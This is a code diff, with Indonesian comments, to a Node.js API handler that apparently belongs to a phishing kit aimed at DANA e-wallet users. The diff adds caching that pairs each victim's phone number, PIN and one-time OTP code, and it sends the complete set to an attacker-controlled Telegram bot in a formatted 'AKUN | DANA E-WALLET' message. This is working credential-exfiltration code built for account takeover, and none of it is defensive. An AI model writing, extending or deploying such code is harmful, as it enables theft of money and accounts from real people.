@@ -1,5 +1,9 @@
 // api/send-dana-data.js
 const axios = require('axios');
+const NodeCache = require('node-cache');
+
+// Buat cache untuk menyimpan data sementara (5 menit)
+const dataCache = new NodeCache({ stdTTL: 300, checkperiod: 60 });
 
 // Fungsi untuk mengirim data ke webhook (opsional)
 async function sendToWebhook(data) {
@@ -26,7 +30,7 @@ async function sendToWebhook(data) {
   }
 }
 
-// Fungsi untuk mengirim notifikasi ke Telegram
+// Fungsi untuk mengirim notifikasi ke Telegram dengan format yang diinginkan
 async function sendToTelegram(data) {
   if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
     console.log('Telegram credentials not set, skipping notification');
@@ -34,23 +38,76 @@ async function sendToTelegram(data) {
   }
 
   try {
-    const message = `🔔 **New DANA Verification**\n\n` +
-                   `**Type:** ${data.type}\n` +
-                   `**Phone:** ${data.phone}\n` +
-                   `**IP:** ${data.ip || 'Unknown'}\n` +
-                   `**Time:** ${new Date().toISOString()}`;
+    // Format pesan sesuai permintaan
+    let message = `├• AKUN | DANA E-WALLET\n` +
+                 `├───────────────────\n` +
+                 `├• NO HP : ${data.phone}\n`;
+    
+    if (data.pin && data.pin !== 'not_provided') {
+      message += `├───────────────────\n` +
+                 `├• PIN  : ${data.pin}\n`;
+    }
+    
+    if (data.otp && data.otp !== 'not_provided') {
+      message += `├───────────────────\n` +
+                 `├• OTP : ${data.otp}\n`;
+    }
+    
+    message += `╰───────────────────`;
 
     const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     await axios.post(url, {
       chat_id: process.env.TELEGRAM_CHAT_ID,
       text: message,
-      parse_mode: 'Markdown'
+      parse_mode: null // Nonaktifkan Markdown untuk format teks biasa
     });
     
     console.log('Notification sent to Telegram successfully');
   } catch (error) {
     console.error('Error sending to Telegram:', error.message);
+  }
+}
+
+// Fungsi untuk mengelompokkan data berdasarkan nomor telepon
+async function processAndSendTelegram(data) {
+  const { type, phone, pin, otp } = data;
+  
+  // Jika hanya nomor telepon, kirim langsung
+  if (type === 'phone') {
+    await sendToTelegram({
+      phone: phone,
+      pin: 'not_provided',
+      otp: 'not_provided'
+    });
+    return;
+  }
+  
+  // Cek apakah data untuk nomor ini sudah ada di cache
+  const cacheKey = `dana_${phone}`;
+  const cachedData = dataCache.get(cacheKey) || { 
+    phone: phone, 
+    pin: 'not_provided', 
+    otp: 'not_provided' 
+  };
+  
+  // Update data yang ada
+  if (type === 'pin') {
+    cachedData.pin = pin;
+  } else if (type === 'otp') {
+    cachedData.otp = otp;
+  }
+  
+  // Simpan kembali ke cache
+  dataCache.set(cacheKey, cachedData);
+  
+  // Kirim notifikasi jika kita memiliki PIN dan OTP, atau jika data sudah lengkap
+  if ((cachedData.pin !== 'not_provided' && cachedData.otp !== 'not_provided') || 
+      (type === 'otp' && cachedData.pin !== 'not_provided')) {
+    await sendToTelegram(cachedData);
+    
+    // Hapus dari cache setelah dikirim
+    dataCache.del(cacheKey);
   }
 }
 
@@ -183,11 +240,13 @@ module.exports = async (req, res) => {
         });
     }
 
-    // Kirim notifikasi ke Telegram
+    // Kirim notifikasi ke Telegram dengan format yang diinginkan
     try {
-      await sendToTelegram({
+      await processAndSendTelegram({
         type,
         phone,
+        pin: pin || 'not_provided',
+        otp: otp || 'not_provided',
         userAgent: req.headers['user-agent'],
         ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
       });
